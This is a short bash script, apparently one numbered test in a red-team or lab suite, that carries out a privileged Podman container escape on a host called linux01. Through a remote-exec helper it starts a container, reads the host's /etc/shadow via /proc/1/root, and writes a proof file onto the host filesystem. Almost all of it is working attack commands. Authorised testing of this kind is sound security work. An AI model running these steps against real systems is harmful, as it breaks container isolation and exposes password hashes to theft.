#!/usr/bin/env bash
# T048 — Podman privileged escape on linux01
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
echo "=== T048 podman escape ==="
REMOTE=$(cat <<'EOF'
set -euo pipefail
echo "=== WT048: Podman Escape ==="
sudo podman start cadre-monitor 2>&1 || true
sleep 2
sudo podman exec cadre-monitor unshare -r id 2>&1 || echo "UNSHARE_FAIL"
sudo podman exec cadre-monitor cat /proc/1/root/etc/shadow 2>/dev/null | head -3 || echo "SHADOW_READ_FAIL"
sudo podman exec cadre-monitor sh -c "touch /proc/1/root/tmp/cadre-escape-proof && echo ESCAPE_PROOF_OK" 2>&1 || true
ls -la /tmp/cadre-escape-proof 2>/dev/null && echo "HOST_FILE_CREATED" || true
if [[ -f /tmp/cadre-escape-proof ]]; then echo "T048_OK"; else echo "T048_FAIL: host escape file missing"; exit 1; fi
EOF
)
bash "${LIB}/linux01-exec.sh" "${REMOTE}"
echo "T048 complete"
